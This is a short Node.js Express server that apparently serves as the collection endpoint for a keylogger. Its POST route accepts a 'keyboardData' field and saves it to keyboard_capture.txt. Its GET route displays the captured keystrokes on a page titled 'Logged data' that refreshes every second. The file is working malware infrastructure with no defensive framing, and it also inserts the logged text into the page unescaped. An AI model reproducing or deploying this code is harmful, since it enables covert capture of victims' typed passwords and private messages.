const fs = require("fs");
const express = require("express");
const bodyParser = require("body-parser");

const app = express();
const port = 8080;

app.use(bodyParser.json({extended: true}));

app.get("/", (req, res) => {
    try {
        const kl_file = fs.readFileSync("./keyboard_capture.txt", {encoding:'utf8', flag:'r'});    
        // Styling the HTML response
        const htmlResponse = `
            <html>
                <head>
                    <style>
                        body {
                            font-family: Arial, sans-serif;
                            background-color: #f0f0f0;
                            padding: 20px;
                        }
                        h1 {
                            color: #333;
                            text-align: center; /* Center align the heading */
                        }
                        p {
                            color: #666;
                        }
                    </style>
                    <meta http-equiv="refresh" content="1"> <!-- Refresh the page every 1 second -->
                </head>
                <body>
                    <h1>Logged data</h1>
                    <p>${kl_file.replace(/\n/g, "<br>")}</p>
                </body>
            </html>
        `;
        res.send(htmlResponse);
    } catch {
        // Center align the message
        res.send("<h1 style='text-align: center;'>Nothing logged yet.</h1>");
    }  
});

app.post("/", (req, res) => {
    console.log(req.body.keyboardData);
    fs.writeFileSync("keyboard_capture.txt", req.body.keyboardData);
    res.send("Successfully set the data");
});

app.listen(port, () => {
    console.log(`App is listening on port ${port}`);
});
